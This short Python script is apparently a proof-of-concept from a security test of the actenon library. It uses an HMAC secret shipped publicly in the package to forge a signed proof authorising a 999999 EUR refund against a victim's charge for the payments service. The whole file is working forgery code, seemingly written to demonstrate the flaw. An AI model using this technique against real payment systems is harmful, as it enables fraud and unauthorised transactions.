"""H2 attacker: knows only the PUBLIC constant shipped in the wheel
(LOCAL_PROOF_SECRET). Runs in the attacker's own dev environment and forges a
PCCB for a refund addressed to the victim's audience."""
import json, sys, os
os.environ["ACTENON_ENV"] = "dev"  # attacker's own machine
from actenon.gate import ActenonGate
from actenon.proof.signers.local import HmacSha256Signer, LOCAL_PROOF_SECRET, LOCAL_PROOF_KEY_ID
s = HmacSha256Signer(secret=LOCAL_PROOF_SECRET, key_id=LOCAL_PROOF_KEY_ID)
gate = ActenonGate(verifier=s, signer=s, audience="service:payments", issuer="service:actenon-local-dev")
action = gate.build_action("refund", "payments.refund", {"amount": 999999, "currency": "EUR"},
                           target_type="charge", target_id="ch_victim", tenant_id="t1", requester_id="attacker")
proof = gate.mint_proof(action)
json.dump({"action": action, "proof": proof.to_dict()}, open(sys.argv[1], "w"), default=str)
print("forged", proof.pccb_id, "with public secret", LOCAL_PROOF_SECRET)
